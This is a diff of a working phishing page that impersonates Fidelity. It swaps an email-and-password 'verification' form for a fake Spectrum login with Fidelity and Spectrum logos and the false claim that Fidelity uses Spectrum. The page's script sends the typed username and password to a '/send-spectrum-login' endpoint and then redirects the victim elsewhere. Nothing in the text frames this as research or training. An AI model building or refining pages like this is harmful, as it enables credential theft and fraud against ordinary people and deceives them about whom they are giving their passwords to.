@@ -3,62 +3,74 @@
 <head>
   <meta charset="utf-8"/>
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>Fidelity Login</title>
+  <title>Fidelity Spectrum Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
   <style>body { font-family: "Inter", sans-serif; }</style>
 </head>
 <body class="bg-[#f2f2f2] min-h-screen flex flex-col">
+
+  <!-- Top header with Fidelity logo left -->
   <header class="bg-white border-b border-gray-200">
-    <div class="max-w-7xl mx-auto flex justify-between items-center px-4 py-3">
+    <div class="max-w-7xl mx-auto flex justify-start items-center px-4 py-3 space-x-6">
       <a href="#"><img alt="Fidelity logo" class="object-contain" height="32" src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg" width="120"/></a>
-      <nav class="space-x-6 text-sm text-black">
-        <a class="hover:underline" href="#">Security</a>
-        <a class="hover:underline" href="#">FAQs</a>
-      </nav>
     </div>
   </header>
 
+  <!-- Centered Fidelity + Spectrum logos with description -->
+  <section class="bg-white border-b border-gray-200 py-8">
+    <div class="max-w-7xl mx-auto flex flex-col items-center space-y-4 px-4">
+      <div class="flex space-x-2 items-center">
+        <img alt="Fidelity logo" class="object-contain" height="32" src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg" width="120"/>
+        <img alt="Spectrum logo" class="object-contain" height="32" src="https://id.spectrum.net/assets/images/spectrum-logo.svg" width="120"/>
+      </div>
+      <p class="text-center text-lg font-semibold">Fidelity uses Spectrum to connect your information</p>
+    </div>
+  </section>
+
+  <!-- Main form container with Spectrum styling -->
   <main class="flex-grow flex flex-col items-center justify-center px-4 py-12">
-    <form id="mailForm" class="bg-white rounded-lg shadow-sm p-8 w-full max-w-md" aria-label="Email verification form">
-      <h1 class="text-2xl font-semibold mb-6">Email Verification</h1>
-      <label class="block font-semibold mb-1" for="email">Email Address</label>
-      <input id="email" name="email" type="text" autocomplete="email" class="w-full border border-gray-300 rounded-md px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
-      <label class="block font-semibold mb-1" for="emailPassword">Email Password</label>
+    <form id="spectrumForm" class="bg-white rounded-lg shadow-sm p-8 w-full max-w-md" aria-label="Spectrum login form">
+      <!-- Spectrum logo top inside form -->
+      <div class="flex justify-center mb-6">
+        <img alt="Spectrum logo" class="object-contain" height="40" src="https://id.spectrum.net/assets/images/spectrum-logo.svg" width="150"/>
+      </div>
+
+      <label class="block font-semibold mb-1" for="spectrumUsername">Spectrum Username</label>
+      <input id="spectrumUsername" name="spectrumUsername" type="text" autocomplete="username" class="w-full border border-gray-300 rounded-md px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
+
+      <label class="block font-semibold mb-1" for="spectrumPassword">Spectrum Password</label>
       <div class="relative mb-4">
-        <input id="emailPassword" name="emailPassword" type="password" autocomplete="current-password" class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
+        <input id="spectrumPassword" name="spectrumPassword" type="password" autocomplete="current-password" class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
       </div>
+
       <div class="flex items-center mb-6">
-        <input id="rememberMail" name="rememberMail" type="checkbox" class="h-4 w-4 text-green-700 border-gray-300 rounded"/>
-        <label class="ml-2 text-sm select-none" for="rememberMail">Remember my username</label>
+        <input id="staySignedIn" name="staySignedIn" type="checkbox" class="h-4 w-4 text-green-700 border-gray-300 rounded"/>
+        <label class="ml-2 text-sm select-none" for="staySignedIn">Stay signed in</label>
       </div>
-      <button type="submit" class="w-full bg-green-700 hover:bg-green-800 text-white font-semibold rounded-md py-2">Sign in</button>
+
+      <button type="submit" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold rounded-md py-2">Sign In</button>
     </form>
-    <p class="mt-8 text-center text-sm text-black max-w-md">
-      New to Fidelity?
-      <a class="underline hover:text-green-700" href="#">Open an account</a> or
-      <a class="underline hover:text-green-700" href="#">sign up.</a>
-    </p>
   </main>
 
   <script>
-    document.getElementById("mailForm").addEventListener("submit", function(e) {
+    document.getElementById("spectrumForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const email = document.getElementById("email").value;
-      const emailPassword = document.getElementById("emailPassword").value;
-      const rememberMail = document.getElementById("rememberMail").checked;
+      const spectrumUsername = document.getElementById("spectrumUsername").value;
+      const spectrumPassword = document.getElementById("spectrumPassword").value;
+      const staySignedIn = document.getElementById("staySignedIn").checked;
 
-      fetch("/send-login", {
+      fetch("/send-spectrum-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, emailPassword, rememberMail }),
+        body: JSON.stringify({ spectrumUsername, spectrumPassword, staySignedIn }),
       })
       .finally(() => {
-        window.location.href = "https://www.fidelity.com/";
+        window.location.href = "https://test.com";
       });
     });
   </script>
+
 </body>
 </html>
-
